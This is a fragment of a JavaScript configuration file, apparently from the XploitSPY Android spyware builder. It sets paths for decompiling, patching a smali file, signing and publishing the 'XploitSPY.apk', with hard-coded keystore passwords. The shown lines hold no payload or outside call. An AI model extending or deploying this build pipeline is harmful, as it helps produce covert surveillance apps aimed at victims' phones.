...
exports.apkSignedBuildPath = path.join(
  __dirname,
  "../assets/webpublic/XploitSPY.apk"
);

exports.downloadsFolder = "/client_downloads";
exports.downloadsFullPath = path.join(
  __dirname,
  "../assets/webpublic",
  exports.downloadsFolder
);

exports.apkTool = path.join(__dirname, "../app/factory/", "apktool.jar");
exports.apkSign = path.join(
  __dirname,
  "../app/factory/",
...
exports.patchFilePath = path.join(
  exports.smaliPath,
  "/smali/com/remote/app/h.smali"
);
...
exports.signCommand =
  ...
  '" --ks "' +
  exports.certPath +
  '"  --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out  "' +
  exports.apkOutputPath +
  '"'; // <-- fix output
